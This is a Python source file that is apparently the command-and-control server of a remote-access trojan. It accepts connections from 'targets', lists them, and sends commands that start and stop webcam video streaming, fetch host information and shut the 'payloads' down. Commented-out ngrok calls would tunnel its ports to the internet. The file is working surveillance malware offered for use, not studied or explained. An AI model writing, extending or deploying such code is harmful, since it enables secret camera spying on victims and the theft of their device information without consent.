import colorama
import socket
from vidstream import StreamingServer
import threading
from prettytable import PrettyTable
import time
import json
import sys
#from assets.colors import colors
#from assets.symbols import *
from pyngrok import ngrok
from configparser import ConfigParser

class colors (object):
    def red():
        return colorama.Fore.RED
    def green():
        return colorama.Fore.GREEN
    def blue():
        return colorama.Fore.BLUE
    def white():
        return colorama.Fore.WHITE
    def yellow():
        return colorama.Fore.YELLOW
    def black():
        return colorama.Fore.BLACK

CR = colors #init the colors class
Splus = f"{CR.red()}|<{CR.green()}+{CR.red()}>|{CR.white()}"
Sminess = f"{CR.red()}|<{CR.yellow()}-{CR.red()}>|{CR.white()}"
Swarning = f"{CR.red()}<|{CR.yellow()}!{CR.red()}>|{CR.white()}"
Ssowrd = f"{CR.red()} ==> {CR.white()}"

#loading config for ["lhost", "SocketPort", "CameraStreamingPort"]
CONFIG_FILE = "server/setting/CS-config.ini"
CONFIG = ConfigParser()
CONFIG.read(CONFIG_FILE)
#setting config to var
HOST = CONFIG["CameraStreaming"]["lhost"]
PORT = int(CONFIG["CameraStreaming"]["socketport"])
CAMERA_STREAMING_PORT = CONFIG["CameraStreaming"]["camerastreamingport"]

TARGETS = {}
#start TCP tunnel
#print(f"\r{Splus} {CR.green()}Starting tcp for socket...", end="")
#ngrok.connect(PORT, "tcp")
#print(f"{CR.blue()}Done")
#print(f"\r{Splus} {CR.green()}Starting TCP for CameraStreaming...", end="")
#ngrok.connect(CAMERA_STREAMING_PORT, "tcp")
#print(f"{CR.blue()}Done")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST , PORT))
server.listen(10)
#colors class

#help menu
def help(TYPE):
    COMMANDS_AND_USE_MAIN = {
        f"{CR.green()}show targets" : f"{CR.blue()}command for showing connecteds targets",
        #f"{CR.green()}start stream" : f"{CR.blue()}command used for start reciving video data from the target",
        #f"{CR.green()}stop stream"  : f"{CR.blue()}command used to stop the stream services of reciving video data from the target {CR.red()}[if it already started !!]",
        f"{CR.green()}connect" : f"{CR.blue()}command use to connect to a specified target {CR.yellow()}[it take one argumnet wich is the target host that you wannt to connect to]",
        f"{CR.green()}help" : f"{CR.blue()}shows this help menu"
    
    }
    COMMANDS_AND_USE_CS  = {
        #f"{CR.green()}show targets" : f"{CR.blue()}command for showing connecteds targets",
        f"{CR.green()}start stream" : f"{CR.blue()}command used for start reciving video data from the target",
        f"{CR.green()}stop stream"  : f"{CR.blue()}command used to stop the stream services of reciving video data from the target {CR.red()}[if it already started !!]",
        f"{CR.green()}back to main" : f"{CR.blue()}command use to get back to the main console",
        f"{CR.green()}get info" : f"{CR.blue()}command the target's info that you are connected too",
        f"{CR.green()}help" : f"{CR.blue()}shows this help menu"
    }
    if TYPE == "main":
        HELP_TABLE = PrettyTable([f"{CR.green()}command{CR.white()}", f"{CR.green()}info{CR.white()}"])
        for x, y in enumerate(COMMANDS_AND_USE_MAIN.items()):
            HELP_TABLE.add_row([f"{CR.blue()}{y[0]}{CR.white()}", f"{CR.yellow()}{y[1]}{CR.white()}"])
        print(HELP_TABLE)
    elif TYPE == "CameraStreaming" :
        HELP_TABLE = PrettyTable([f"{CR.green()}command{CR.white()}", f"{CR.green()}info{CR.white()}"])
        for x, y in enumerate(COMMANDS_AND_USE_CS.items()):
            HELP_TABLE.add_row([f"{CR.blue()}{y[0]}{CR.white()}", f"{CR.yellow()}{y[1]}{CR.white()}"])
        print(HELP_TABLE)

def recv_target_info(target):
    DATA = target.recv(99999).decode()
    if json.loads(DATA):
        with open(f"target_info/{target.getsockname()[0]}.json", "w") as info_save:
            json.dump(json.loads(DATA), info_save, indent=6)
        info_save.close()
        with open(f"{target.getsockname()[0]}.json", "r") as info:
            for x, y in enumerate(dict(json.load(info)).items()):
                print(f"{' '*7}{CR.green()} {y[0]}{CR.yellow()} --> {CR.blue()}{y[1]}{CR.white()}")

def StartCameraStreamingServer(host, port):
    global CAMERA_STREAMING    
    CAMERA_STREAMING = StreamingServer(host, port)
    CAMERA_STREAMING_THREAD = threading.Thread(
                    target=CAMERA_STREAMING.start_server()
            )
    CAMERA_STREAMING_THREAD.start()
def StopCameraStreamingServer() :
    CAMERA_STREAMING.stop_server()

def TARGETS_SHOWER():
    TARGET_TABLE = PrettyTable([f"{CR.red()}ip{CR.white()}", f"{CR.red()}port{CR.white()}"])
    for x in TARGETS:
        try :
            x.send("".encode())
            time.sleep(0.1)
            TARGET_TABLE.add_row([f"{CR.green()}{TARGETS[x][0]}{CR.white()}", f"{CR.green()}{TARGETS[x][1]}{CR.white()}"])
        except:
            pass
    print(TARGET_TABLE)

def connect_with_host(target_add):
    SERVER_UP = False
    print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
    while True:
        COMMAND_FOR_TARGET_SESSION = input(f"\r{CR.red()} <|{CR.green()}session{CR.white()}-{CR.blue()}target={CR.yellow()}{TARGETS[target_add][0]}{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
        if COMMAND_FOR_TARGET_SESSION == "start stream":
            if SERVER_UP:
                print(f"{Sminess} {CR.red()}Stream is already up{CR.white()}")
            else:
                JSON_MSG = {
                    "command" : "start stream"
                }
                target_add.send(json.dumps(JSON_MSG).encode())
                time.sleep(0.4)
                SERVER_UP = True
                StartCameraStreamingServer(
                    host=HOST,
                    port=CAMERA_STREAMING_PORT
                )
        elif COMMAND_FOR_TARGET_SESSION == "stop stream":
            if SERVER_UP:
                JSON_MSG_TO_STOP_STREAM = {
                    "command" : "stop stream"
                }
                target_add.send(json.dumps(JSON_MSG_TO_STOP_STREAM).encode())
                StopCameraStreamingServer()
                SERVER_UP = False
                print(f"{Splus} {CR.green()}Stream stoped{CR.white()}")
            else:
                print(f"{Sminess} {CR.red()}Stream isn't up to stop it {CR.white()}")
        elif COMMAND_FOR_TARGET_SESSION == "help":
            help(TYPE="CameraStreaming")
        elif COMMAND_FOR_TARGET_SESSION == "get info":
            INFO_MSG = {
                "command" : "get info"
            }
            target_add.send(json.dumps(INFO_MSG).encode())
            "\n"
            recv_target_info(target=target_add)
            "\n"
        elif COMMAND_FOR_TARGET_SESSION == "back to main":
            if SERVER_UP:
                print(f"\r{Swarning} {CR.green()}Stoping the stream recv...", end="")
                StopCameraStreamingServer()
                print(f"{CR.blue()}Done")
            else:
                pass
            break

def upcoming_connection():
    while True:
        add, ip = server.accept()
        print(f"\n{Splus} {CR.green()}Target connected {CR.yellow()} |{CR.red()} Host> {CR.blue()}{ip[0]} {CR.red()}Port> {CR.blue()}{ip[1]}\n")
        if add in TARGETS:
            pass
        else:
            TARGETS[add] = ip

#Threads
UPCOMING_CONN_THREAD = threading.Thread(target=upcoming_connection)

def run():
    #starting threads
    UPCOMING_CONN_THREAD.start()
    #console for server
    while True:
        COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}server{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
        if COMMAND_INPUT == "show targets":
            TARGETS_SHOWER()
        elif COMMAND_INPUT.startswith("connect"):
            THE_ADDR = COMMAND_INPUT.replace("connect ", "")
            if THE_ADDR:
                for x in TARGETS:
                    if x.getsockname()[0] == THE_ADDR:
                        connect_with_host(target_add=x)
            else:
                print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")
        elif COMMAND_INPUT == "help":
            help(TYPE="main")
        elif COMMAND_INPUT == "exit":
            SHUTDOWN_MSG = {
                "command" : "stop connection"
                }
            for x in TARGETS:
                try:
                    time.sleep(1)
                    x.send(json.dumps(SHUTDOWN_MSG).encode())
                except:
                    x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down


run()